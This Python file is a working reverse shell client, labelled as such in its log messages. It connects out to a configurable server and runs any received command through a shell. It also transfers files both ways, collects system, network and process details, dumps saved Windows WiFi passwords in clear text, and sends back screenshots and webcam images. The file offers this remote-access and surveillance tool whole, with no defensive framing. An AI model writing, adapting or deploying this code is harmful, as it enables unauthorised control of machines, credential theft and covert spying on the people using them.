import socket
import os
import subprocess
import datetime
import json
import time
import sys
import hashlib
import platform
import getpass

# Load configuration from config.json
def load_config():
    try:
        with open("config.json", "r") as config_file:
            config = json.load(config_file)
            log_message("Configuration loaded from config.json")
            return config
    except FileNotFoundError:
        log_message("config.json not found, using default values", "WARNING")
        return None
    except json.JSONDecodeError as e:
        log_message(f"Invalid JSON in config file: {e}", "ERROR")
        return None
    except Exception as e:
        log_message(f"Error loading config: {e}", "ERROR")
        return None

# Simple logging function
def log_message(message, level="INFO"):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] [{level}] {message}\n"
    
    try:
        with open("client.log", "a") as log_file:
            log_file.write(log_entry)
    except:
        pass

# Display countdown with live updates
def countdown_display(seconds, message="Retrying"):
    try:
        for i in range(seconds, 0, -1):
            sys.stdout.write(f"\r{message} in {i} seconds...")
            sys.stdout.flush()
            time.sleep(1)
        sys.stdout.write("\r" + " " * 50 + "\r")
        sys.stdout.flush()
    except KeyboardInterrupt:
        sys.stdout.write("\r" + " " * 50 + "\r")
        sys.stdout.flush()
        raise

# Display progress bar for file transfers
def show_progress(current, total, filename, action="Transferring"):
    percent = (current / total) * 100
    bar_len = 30
    filled = int(bar_len * current / total)
    bar = '█' * filled + '░' * (bar_len - filled)
    size_mb = total / (1024 * 1024)
    current_mb = current / (1024 * 1024)
    sys.stdout.write(f"\r{action}: {filename} [{bar}] {percent:.1f}% ({current_mb:.2f}/{size_mb:.2f} MB)")
    sys.stdout.flush()
    if current >= total:
        print()

# Validate filename (only check if empty)
def validate_filename(filename):
    if not filename or filename.strip() == "":
        return False, "Filename cannot be empty"
    return True, None

# Calculate MD5 hash of a file
def calculate_hash(filepath):
    md5 = hashlib.md5()
    with open(filepath, 'rb') as f:
        for chunk in iter(lambda: f.read(4096), b""):
            md5.update(chunk)
    return md5.hexdigest()

# Connect to server
def connect_to_server(host, port):
    try:
        s = socket.socket()
        log_message(f"Attempting to connect to {host}:{port}")
        s.connect((host, port))
        log_message(f"Connected successfully to {host}:{port}")
        return s
    except socket.error as e:
        log_message(f"Connection failed: {str(e)}", "ERROR")
        return None
    except Exception as e:
        log_message(f"Unexpected error during connection: {str(e)}", "ERROR")
        return None

# Check if connection is still alive
def is_connection_alive(s):
    try:
        s.recv(1, socket.MSG_PEEK)
        return True
    except socket.error:
        return False
    except Exception:
        return False

# Send file to server (for download command)
def send_file(s, filename):
    try:
        if not os.path.isfile(filename):
            s.send(b"FILE_NOT_FOUND")
            log_message(f"File not found: {filename}", "ERROR")
            return False
        
        file_size = os.path.getsize(filename)
        s.send(file_size.to_bytes(8, 'big'))
        
        with open(filename, 'rb') as f:
            bytes_sent = 0
            while bytes_sent < file_size:
                chunk = f.read(4096)
                if not chunk:
                    break
                s.send(chunk)
                bytes_sent += len(chunk)
                show_progress(bytes_sent, file_size, filename, "Sending")
        
        file_hash = calculate_hash(filename)
        s.send(file_hash.encode('utf-8'))
        log_message(f"File sent: {filename} [Hash: {file_hash[:8]}...]")
        return True
        
    except Exception as e:
        log_message(f"Error sending file: {str(e)}", "ERROR")
        return False

# Receive file from server (for upload command)
def receive_file(s, filename):
    try:
        file_size = int.from_bytes(s.recv(8), 'big')
        log_message(f"Receiving {filename} ({file_size} bytes)...")
        
        bytes_received = 0
        with open(filename, 'wb') as f:
            while bytes_received < file_size:
                chunk = s.recv(min(4096, file_size - bytes_received))
                if not chunk:
                    break
                f.write(chunk)
                bytes_received += len(chunk)
                show_progress(bytes_received, file_size, filename, "Receiving")
        
        remote_hash = s.recv(32).decode('utf-8')
        local_hash = calculate_hash(filename)
        
        if remote_hash == local_hash:
            log_message(f"File received: {filename} [Hash verified: {local_hash[:8]}...]")
        else:
            log_message(f"WARNING: Hash mismatch! File may be corrupted", "WARNING")
        
        return True
        
    except Exception as e:
        log_message(f"Error receiving file: {str(e)}", "ERROR")
        return False

# Execute commands received from server
def execute_commands(s):
    try:
        while True:
            try:
                if not is_connection_alive(s):
                    log_message("Connection health check failed", "WARNING")
                    break
                
                s.settimeout(1.0)
                
                try:
                    data = s.recv(1024)
                except socket.timeout:
                    continue
                
                s.settimeout(None)
                
                if not data:
                    log_message("Server closed connection", "WARNING")
                    break
                
                cmd = data.decode("utf-8")
                
                if cmd.startswith("download "):
                    filename = cmd[9:].strip()
                    valid, error = validate_filename(filename)
                    if not valid:
                        log_message(f"Invalid filename: {error}", "ERROR")
                        s.send(b"FILE_NOT_FOUND")
                        continue
                    log_message(f"Download requested: {filename}")
                    send_file(s, filename)
                    continue
                
                if cmd.startswith("upload "):
                    filename = cmd[7:].strip()
                    valid, error = validate_filename(filename)
                    if not valid:
                        log_message(f"Invalid filename: {error}", "ERROR")
                        continue
                    log_message(f"Upload incoming: {filename}")
                    receive_file(s, filename)
                    continue
                
                if cmd == "sysinfo":
                    try:
                        import ctypes
                        is_admin = ctypes.windll.shell32.IsUserAnAdmin() if platform.system() == "Windows" else os.geteuid() == 0
                    except:
                        is_admin = False
                    
                    info = f"""
=== System Information ===
OS: {platform.system()} {platform.release()}
Version: {platform.version()}
Hostname: {platform.node()}     
Username: {getpass.getuser()}
Admin: {'Yes' if is_admin else 'No'}
Architecture: {platform.machine()}
Processor: {platform.processor()}
Python: {platform.python_version()}
Home: {os.path.expanduser('~')}
"""
                    s.send(info.encode() + os.getcwd().encode() + b"> ")
                    continue
                
                if cmd == "ipconfig":
                    hostname = socket.gethostname()
                    try:
                        local_ip = socket.gethostbyname(hostname)
                    except:
                        local_ip = "Unable to get"
                    
                    info = f"""
=== Network Information ===
Hostname: {hostname}
Local IP: {local_ip}
"""
                    try:
                        result = subprocess.run(['ipconfig'] if platform.system() == 'Windows' else ['ifconfig'], 
                                              capture_output=True, text=True, timeout=10)
                        info += result.stdout
                    except:
                        info += "Could not get detailed network info\n"
                    
                    s.send(info.encode() + os.getcwd().encode() + b"> ")
                    continue
                
                if cmd == "processes":
                    info = "=== Running Processes (Top 50) ===\n"
                    try:
                        if platform.system() == 'Windows':
                            result = subprocess.run(['tasklist'], capture_output=True, text=True, timeout=15)
                        else:
                            result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=15)
                        lines = result.stdout.split('\n')[:50]
                        info += '\n'.join(lines)
                        if len(result.stdout.split('\n')) > 50:
                            info += f"\n... and {len(result.stdout.split(chr(10))) - 50} more processes\n"
                    except Exception as e:
                        info += f"Error getting processes: {str(e)}\n"
                    
                    s.send(info.encode() + os.getcwd().encode() + b"> ")
                    continue
                
                if cmd == "wifi":
                    info = "=== Saved WiFi Passwords ===\n"
                    if platform.system() != 'Windows':
                        info += "This command only works on Windows\n"
                    else:
                        try:
                            profiles = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], 
                                                     capture_output=True, text=True, timeout=15)
                            networks = []
                            for line in profiles.stdout.split('\n'):
                                if "All User Profile" in line:
                                    network = line.split(':')[1].strip()
                                    networks.append(network)
                            
                            for network in networks:
                                try:
                                    result = subprocess.run(
                                        ['netsh', 'wlan', 'show', 'profile', network, 'key=clear'],
                                        capture_output=True, text=True, timeout=10)
                                    password = "Not found"
                                    for line in result.stdout.split('\n'):
                                        if "Key Content" in line:
                                            password = line.split(':')[1].strip()
                                            break
                                    info += f"Network: {network} | Password: {password}\n"
                                except:
                                    info += f"Network: {network} | Password: Error\n"
                            
                            if not networks:
                                info += "No saved WiFi networks found\n"
                        except Exception as e:
                            info += f"Error: {str(e)}\n"
                    
                    s.send(info.encode() + os.getcwd().encode() + b"> ")
                    continue
                
                if cmd == "help":
                    info = """
=== Available Commands ===
sysinfo    - System information (OS, hostname, user)
ipconfig   - Network configuration and IP addresses
processes  - List running processes (top 50)
wifi       - Extract saved WiFi passwords (Windows)
download   - Download file from client
upload     - Upload file to client
cd         - Change directory
help       - Show this help message
quit       - Close connection
"""
                    s.send(info.encode() + os.getcwd().encode() + b"> ")
                    continue
                
                if cmd == "screenshot":
                    info = "=== Screenshot Capture ===\n"
                    try:
                        from PIL import ImageGrab
                        import tempfile
                        
                        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                        filename = f"screenshot_{timestamp}.png"
                        filepath = os.path.join(tempfile.gettempdir(), filename)
                        
                        screenshot = ImageGrab.grab()
                        screenshot.save(filepath)
                        
                        info += f"Screenshot saved: {filepath}\n"
                        info += "Transferring to server...\n"
                        s.send(info.encode())
                        
                        send_file(s, filepath)
                        os.remove(filepath)
                        continue
                    except ImportError:
                        info += "ERROR: Pillow not installed. Run: pip install pillow\n"
                        s.send(info.encode() + os.getcwd().encode() + b"> ")
                        continue
                    except Exception as e:
                        info += f"Error: {str(e)}\n"
                        s.send(info.encode() + os.getcwd().encode() + b"> ")
                        continue
                
                if cmd == "webcam":
                    info = "=== Webcam Capture ===\n"
                    try:
                        import cv2
                        import tempfile
                        
                        cap = cv2.VideoCapture(0)
                        if not cap.isOpened():
                            info += "ERROR: No webcam found or webcam in use\n"
                            s.send(info.encode() + os.getcwd().encode() + b"> ")
                            continue
                        
                        ret, frame = cap.read()
                        cap.release()
                        
                        if not ret:
                            info += "ERROR: Failed to capture from webcam\n"
                            s.send(info.encode() + os.getcwd().encode() + b"> ")
                            continue
                        
                        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                        filename = f"webcam_{timestamp}.png"
                        filepath = os.path.join(tempfile.gettempdir(), filename)
                        
                        cv2.imwrite(filepath, frame)
                        
                        info += f"Webcam captured: {filepath}\n"
                        info += "Transferring to server...\n"
                        s.send(info.encode())
                        
                        send_file(s, filepath)
                        os.remove(filepath)
                        continue
                    except ImportError:
                        info += "ERROR: OpenCV not installed. Run: pip install opencv-python\n"
                        s.send(info.encode() + os.getcwd().encode() + b"> ")
                        continue
                    except Exception as e:
                        info += f"Error: {str(e)}\n"
                        s.send(info.encode() + os.getcwd().encode() + b"> ")
                        continue
                
                if data[:2].decode("utf-8") == 'cd':
                    try:
                        os.chdir(data[3:].decode("utf-8"))
                        log_message(f"Changed directory to: {os.getcwd()}")
                    except Exception as e:
                        log_message(f"Failed to change directory: {str(e)}", "ERROR")
                        error_msg = f"Error: {str(e)}\n"
                        try:
                            s.send(str.encode(error_msg + os.getcwd() + "> "))
                        except socket.error:
                            log_message("Failed to send response - connection lost", "ERROR")
                            break
                        continue
                
                if len(data) > 0:
                    try:
                        cmd_str = data[:].decode("utf-8")
                        log_message(f"Executing command: {cmd_str}")
                        
                        cmd = subprocess.Popen(
                            cmd_str, 
                            shell=True,
                            stdout=subprocess.PIPE,
                            stdin=subprocess.PIPE,
                            stderr=subprocess.PIPE
                        )
                        
                        output_byte = cmd.stdout.read() + cmd.stderr.read()
                        output_str = str(output_byte, "utf-8")
                        currentWD = os.getcwd() + "> "
                        
                        try:
                            s.send(str.encode(output_str + currentWD))
                            log_message(f"Command executed successfully")
                        except socket.error as e:
                            log_message(f"Failed to send response: {str(e)}", "ERROR")
                            break
                        
                    except Exception as e:
                        log_message(f"Error executing command: {str(e)}", "ERROR")
                        error_msg = f"Error executing command: {str(e)}\n"
                        try:
                            s.send(str.encode(error_msg + os.getcwd() + "> "))
                        except socket.error:
                            log_message("Failed to send error message - connection lost", "ERROR")
                            break
                            
            except socket.error as e:
                log_message(f"Socket error: {str(e)}", "ERROR")
                break
            except Exception as e:
                log_message(f"Unexpected error in command loop: {str(e)}", "ERROR")
                break
                
    except KeyboardInterrupt:
        log_message("Client interrupted by user", "WARNING")
    except Exception as e:
        log_message(f"Error in execute_commands: {str(e)}", "ERROR")
    finally:
        try:
            s.close()
            log_message("Connection closed")
        except:
            pass

def main():
    config = load_config()
    
    if config and "client" in config:
        host = config["client"].get("server_ip", "127.0.0.1")
        port = config["client"].get("server_port", 9999)
        reconnect_enabled = config["client"].get("reconnect_enabled", False)
        reconnect_delay = config["client"].get("reconnect_delay", 5)
        max_attempts = config["client"].get("max_reconnect_attempts", 0)
    else:
        host = "127.0.0.1"
        port = 9999
        reconnect_enabled = False
        reconnect_delay = 5
        max_attempts = 0
        log_message("Using default configuration", "WARNING")
    
    log_message("=" * 50)
    log_message("Reverse Shell Client Starting...")
    log_message("=" * 50)
    
    attempt = 0
    
    try:
        while True:
            attempt += 1
            
            if max_attempts > 0 and attempt > max_attempts:
                log_message(f"Maximum reconnection attempts ({max_attempts}) reached. Exiting...", "ERROR")
                break
            
            if attempt > 1:
                log_message(f"Reconnection attempt #{attempt}")
            
            log_message(f"Attempting to connect to {host}:{port}")
            
            s = connect_to_server(host, port)
            
            if s is not None:
                log_message("Connection established successfully")
                attempt = 0
                
                execute_commands(s)
                
                log_message("Connection lost", "WARNING")
                
                if not reconnect_enabled:
                    log_message("Auto-reconnect is disabled. Exiting...", "WARNING")
                    break
                
                log_message(f"Reconnecting in {reconnect_delay} seconds...")
                countdown_display(reconnect_delay, "Reconnecting")
            else:
                if not reconnect_enabled:
                    log_message("Failed to connect to server. Exiting...", "ERROR")
                    break
                
                if max_attempts == 0:
                    log_message(f"Connection failed. Unlimited retries enabled.", "WARNING")
                else:
                    remaining = max_attempts - attempt
                    log_message(f"Connection failed. {remaining} attempt(s) remaining.", "WARNING")
                
                countdown_display(reconnect_delay, "Retrying")
                
    except KeyboardInterrupt:
        log_message("\nClient interrupted by user (Ctrl+C)", "WARNING")
    
    log_message("Client shutting down...")

if __name__ == "__main__":
    main()
